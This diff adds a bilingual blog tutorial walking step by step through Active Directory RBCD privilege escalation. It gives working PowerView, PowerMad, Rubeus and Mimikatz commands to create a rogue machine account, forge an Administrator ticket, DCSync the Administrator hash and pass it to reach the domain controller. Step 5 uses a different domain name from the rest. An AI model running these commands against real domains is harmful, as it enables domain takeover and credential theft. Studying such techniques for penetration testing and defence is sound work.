@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Domain Privilege Escalation - RBCD | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Domain Privilege Escalation - RBCD</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-11-20</span>
+</div>
+<h1 class="post-title">Domain Privilege Escalation - RBCD</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>This article covers the eighth Domain Privilege Escalation technique: RBCD, which stands for Resource-based Constrained Delegation.</p>
+<h3>Prerequisites</h3>
+<p>To execute this technique, you must have one of the following permissions on the target machine: Generic All, Generic Write, or Write Property. Without one of these ACL permissions on the target, this attack is not possible.</p>
+<h2>How Does Resource-based Constrained Delegation Work?</h2>
+<p>The concept is similar to the Constrained Delegation technique covered in a previous article, but with important differences in how the delegation is configured.</p>
+<p>In RBCD, the delegation configuration is set on the target (resource) side rather than on the service account side. Here is how the attack works:</p>
+<ol>
+<li>We create a fake (rogue) machine account on the domain and assign it a known password.</li>
+<li>We then add a new property called <code>msds-allowedtoactonbehalfofotheridentity</code> on the target machine, setting its value to the SID of our fake machine. This tells the target machine to trust delegation requests coming from our rogue machine.</li>
+<li>Using Rubeus, we request a service ticket (TGS) for any service on the target machine through our fake machine, impersonating a high-privilege user like Administrator.</li>
+</ol>
+<p>The specific service we request determines what we can do on the target:
+- <strong>HTTP</strong> -- Enables PowerShell Remoting (PS Remoting) to the target.
+- <strong>CIFS</strong> -- Allows browsing files on the target machine.
+- <strong>HOST</strong> -- Enables scheduling tasks on the target, which can be used to execute a reverse shell.
+- <strong>LDAP</strong> -- If the target is the Domain Controller, this allows us to perform a DCSync attack to extract the NTLM hashes of Domain Admins and then execute a Pass the Hash attack.</p>
+<h2>Walkthrough</h2>
+
+<figure class="article-img"><img src="../assets/images/rbcd/2.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Load PowerView and Enumerate ACLs</h3>
+<p>We start by logging in as the user <code>HRmanager</code>. First, load the PowerView module:</p>
+<pre><code class="language-powershell">Import-Module .\powerview.ps1
+</code></pre>
+<p>Next, enumerate the Access Control Lists (ACLs) across the domain to find any permissions that benefit us:</p>
+<pre><code class="language-powershell">Find-InterestingDomainAcl -ResolveGUIDs
+</code></pre>
+<p>After examining the output, we can see that the <code>HRmanager</code> user (found in the <code>IdentityReferenceName</code> field) has <strong>Write Property</strong> permission on the Domain Controller machine (shown in the <code>ObjectDN</code> field). This is exactly what we need to carry out the RBCD attack.</p>
+<h3>Step 2: Load PowerMad and Create a Fake Machine Account</h3>
+<p>Download and load the PowerMad module, which allows us to create rogue machine accounts:</p>
+<pre><code class="language-powershell">Import-Module .\powermad.ps1
+</code></pre>
+<p>Now create a fake machine account named <code>dude</code> with the password <code>123</code>:</p>
+<pre><code class="language-powershell">New-MachineAccount -Domain cyber.local -MachineAccount dude -Password (ConvertTo-SecureString '123' -AsPlainText -Force) -Verbose
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/rbcd/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Extract the SID of the Fake Machine</h3>
+<p>We need the SID (Security Identifier) of our newly created fake machine account. This SID will be used when configuring the delegation property on the target:</p>
+<pre><code class="language-powershell">Get-NetComputer dude | Select objectsid
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/rbcd/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 4: Build the Security Descriptor</h3>
+<p>Using the SID we extracted in the previous step, we construct a raw security descriptor. This descriptor defines that our fake machine is allowed to act on behalf of other identities on the target. Replace the SID in the command below with the one you obtained:</p>
+<pre><code class="language-powershell">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4117163453-3728762355-2024759166-1601)&quot;
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/rbcd/5.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 5: Set the Delegation Property on the Target Machine</h3>
+<p>Now we write the <code>msds-allowedtoactonbehalfofotheridentity</code> attribute on the target machine (the Domain Controller), assigning it the security descriptor that contains our fake machine's SID:</p>
+<pre><code class="language-powershell">Get-NetComputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+</code></pre>
+<p>This effectively tells the Domain Controller: "The machine with this SID is allowed to delegate and act on behalf of other users when accessing my services."</p>
+<h3>Step 6: Generate the AES256 Hash of the Fake Machine's Password</h3>
+<p>Before we can request tickets through Rubeus, we need the AES256-encrypted version of our fake machine's password. Rubeus can compute this for us:</p>
+<pre><code class="language-powershell">.\Rubeus.exe hash /password:123 /user:dude$ /domain:cyber.local
+</code></pre>
+<p>Note the <code>$</code> appended to the username, as this is a machine account.</p>
+
+<figure class="article-img"><img src="../assets/images/rbcd/6.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 7: Request a TGS via S4U</h3>
+<p>Now we use Rubeus to perform the S4U (Service for User) attack. Since our target is the Domain Controller, we request a TGS for the LDAP service, which will allow us to perform a DCSync attack later. We impersonate the domain Administrator:</p>
+<pre><code class="language-powershell">.\Rubeus.exe s4u /domain:cyber.local /dc:JehadDC.cyber.local /user:dude$ /ptt /aes256:5B9C740C2E833C237562871A4B3C3B7FF7839D48C3CBB3CBB152E2E82C981928 /impersonateuser:Administrator /msdsspn:ldap/jehaddc.cyber.local
+</code></pre>
+<ul>
+<li><code>/user:dude$</code> specifies our fake machine account.</li>
+<li><code>/ptt</code> injects the resulting ticket directly into memory.</li>
+<li><code>/aes256:...</code> provides the AES256 hash of the fake machine's password.</li>
+<li><code>/impersonateuser:Administrator</code> tells the KDC we want a ticket impersonating the Administrator.</li>
+<li><code>/msdsspn:ldap/jehaddc.cyber.local</code> specifies the LDAP service on the Domain Controller as the target service.</li>
+</ul>
+<p>You should substitute the domain, DC hostname, AES256 hash, and service SPN according to your specific environment. You can also substitute different services in the <code>/msdsspn</code> parameter depending on your objective, as described at the beginning of this article.</p>
+
+<figure class="article-img"><img src="../assets/images/rbcd/7.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 8: Verify the Ticket Was Injected</h3>
+<p>Confirm that the TGS was successfully injected into memory:</p>
+<pre><code class="language-powershell">klist
+</code></pre>
+<p>If the output shows a cached ticket for <code>ldap/jehaddc.cyber.local</code>, the injection was successful.</p>
+
+<figure class="article-img"><img src="../assets/images/rbcd/8.png" alt="Step 7" loading="lazy"></figure>
+<h3>Step 9: Perform DCSync to Extract the Domain Admin Hash</h3>
+<p>Since we now have a TGS for the LDAP service on the Domain Controller, we can use Mimikatz to perform a DCSync attack. This replicates the behavior of a Domain Controller and pulls the NTLM hash of the domain Administrator:</p>
+<pre><code>lsadump::dcsync /user:cyber\Administrator
+</code></pre>
+<p>This returns the NTLM hash of the Administrator account (for example: <code>311fb27b1e766dac7357f4270f4112df</code>).</p>
+<h3>Step 10: Pass the Hash and Gain Domain Admin Access</h3>
+<p>With the Administrator's NTLM hash in hand, we use Mimikatz to perform a Pass the Hash attack. This launches a new PowerShell session running under the context of the Domain Administrator:</p>
+<pre><code>sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain:cyber.local /run:powershell.exe
+</code></pre>
+<p>A new PowerShell window opens with Domain Admin privileges. From this elevated session, we can connect to the Domain Controller directly:</p>
+<pre><code class="language-powershell">Enter-PSSession jehaddc.cyber.local
+</code></pre>
+<p>This gives us a fully interactive PowerShell session on the Domain Controller as the domain Administrator, completing the privilege escalation.</p>
+<figure class="article-img"><img src="../assets/images/rbcd/9.png" alt="Step 8" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح التكينك الثامن لي الـDomain Privilege وهو الـ RBCD او Resource-based Constrained Delegation</p>
+<p>متطلبات التكنيك: يجب ان يكون لديك صلاحية Generic All او Generic Write او Write Property على الجهاز المستهدف</p>
+<p>قبل نبدا نطبق التكنيك خلونا نعرف ايش هي فكرة Resource-based Constrained Delegation ؟</p>
+<p>الفكرة مشابهه لتكنيك Constrained Delegation المشروح سابقا</p>
+<p>لكن هذا التكنيك راح يختلف شوي بحيث انه راح ننشأ جهاز مزيف او fake ونحدد له باسورد معين ومن ثم نضيف New Property على الجهاز المستهدف و اللي هي</p>
+<p>msds-allowedtoactonbehalfofotheridentity تحتوي على قيمة ال SID الخاصة بالجهاز ال مزيف</p>
+<p>بعد كذا راح نتستخدم اداة Rubeus بحيث انه نطلب اي سيرفس على الجهاز المستهدف مثل http عشان نسوي PS Remoting او cifs عشان نتصفح الملفات الخاصة بالجهاز المستهدف او host عشان ننفذ scheduling tasks ونحصل على Reverse Shell او ldap اذا كان الجهاز المستهدف هو ال DC بحيث تسحب الهاش الخاص في ال Domain Admins وتنفذ تكنيك Pass the Hash وكل هذي الطلبات راح تكون عن طريق الجهاز المزيف</p>
+<p>الشرح:</p>
+<p>اولا انا داخل بالمستخدم اللي اسمه HRmanager</p>
+<p>الان راح اسوي Load لي اداة Power View عن طريق هذا الامر:</p>
+<p>Import-Module .\powerview.ps1</p>
+<figure class="article-img"><img src="../assets/images/rbcd/2.png" alt="Step 1" loading="lazy"></figure>
+
+<p>الان راح ننفذ هذا الامر عشان نشوف هل المتسخدم HRmanager عنده ACLs تهمنا او لا :</p>
+<p>Find-InterestingDomainAcl -ResolveGUIDs</p>
+<p>الان لو نلاحظ حقل المستخدم HRmanager الموجود في حقل IdentityReferenceName يحتوي على صلاحية Write Property على جهاز ال Domain Controller الموجود في حقل ObjectDN (:</p>
+<p>الان راح احمل اداة PowerMad عشان ننشأ جهاز مزيف</p>
+<figure class="article-img"><img src="../assets/images/rbcd/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>بعد التحميل راح اسوي لها Load عن طريق هذا الامر:</p>
+<p>Import-Module .\powermad.ps1</p>
+<p>الان راح ننشأ جهاز مزيف يكون الباسورد الخاص فيه 123 عن طريق هذا الامر:</p>
+<p>New-MachineAccount -Domain cyber.local -MachineAccount dude -Password (ConvertTo-SecureString '123' -AsPlainText -Force) -Verbose</p>
+<p>الان نحتاج نستخرج ال SID الخاص في الجهاز المزيف عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/rbcd/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>Get-NetComputer dude | select objectsid</p>
+<p>الان بعد ما استخرجنا ال SID الخاص في الجهاز المزيف راح ننفذ هذي الاوامر مع تعويض ال SID الخاص في الجهاز المزيف</p>
+<p>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4117163453-3728762355-2024759166-1601)"</p>
+<p>$SDBytes = New-Object byte[] ($SD.BinaryLength)</p>
+<figure class="article-img"><img src="../assets/images/rbcd/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>$SD.GetBinaryForm($SDBytes, 0)</p>
+<p>الان راح ننشأ للجهاز المستهدف خاصية جديدة تسمى msds-allowedtoactonbehalfofotheridentity ونسند لها قيمة ال SID الخاص في الجهاز المزيف عن طريق هذا الامر:</p>
+<p>Get-netcomputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</p>
+<p>الان راح احمل اداة Rubeus وننفذ هذا الامر بحيث يعطينا نسخه مشفرة من نوع AES256 لي الباسورد الخاص في الجهاز المزيف:</p>
+<figure class="article-img"><img src="../assets/images/rbcd/6.png" alt="Step 5" loading="lazy"></figure>
+
+<p>.\Rubeus.exe hash /password:123 /user:dude$ /domain:cyber.local</p>
+<p>الان راح ننفذ هذا الامر عشان نحصل على ال TGS الخاصه في ال ldap سيرفس بما انه الجهاز المستهدف هو ال Domain Controller (DC)</p>
+<p>.\Rubeus.exe s4u /domain:cyber.local /dc:JehadDC.cyber.local /user:dude$ /ptt /aes256:5B9C740C2E833C237562871A4B3C3B7FF7839D48C3CBB3CBB152E2E82C981928 /impersonateuser:Administrator /msdsspn:ldap/jehaddc.cyber.local</p>
+<p>طبعا انت راح تعوض حقول معينه حسب الدومين اللي انت متواجد عليه وحسب تشفير الباسورد اللي ظهر لك</p>
+<figure class="article-img"><img src="../assets/images/rbcd/7.png" alt="Step 6" loading="lazy"></figure>
+
+<p>وممكن في حقل msdsspn تعوض اي سيرفس تبيها وكل سيرفس ويختلف استغلالها زي ماذكرت بداية المقالة</p>
+<p>الان بعد تنفيذ الامر السابق راح نتاكد هل تم حقن ال TGS في الميموري او لا عن طريق هذا الامر:</p>
+<p>klist</p>
+<p>الان تاكدنا انه تم حقن ال TGS في الميموري</p>
+<p>الان بما انه معنا ال TGS الخاصة في سيرفس ldap راح نشغل mimikatz ونسحب الهاش الخاص في ال Domain Admin عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/rbcd/8.png" alt="Step 7" loading="lazy"></figure>
+
+<p>lsadump::dcsync /user:cyber\Administrator</p>
+<p>الان راح نسوي تكنيك pass the hash عن طريق mimikatz بحيث نشغل جلسة PowerShell بصلاحية Domain Admin عن طريق هذا الامر:</p>
+<p>sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain:cyber.local /run:powershell.exe</p>
+<p>بعد تنفيذ الامر راح تفتح لنا جلسة powershell بصلاحية Domain Admin كل اللي علينا انه ننفذ هذا الامر عشان ندخل للجهاز المستهدف:</p>
+<figure class="article-img"><img src="../assets/images/rbcd/9.png" alt="Step 8" loading="lazy"></figure>
+
+<p>Enter-PSSession jehaddc.cyber.local</p>
+<p>وصلنا لنهاية المقالة اتمنى انها نالت على اعجابكم</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
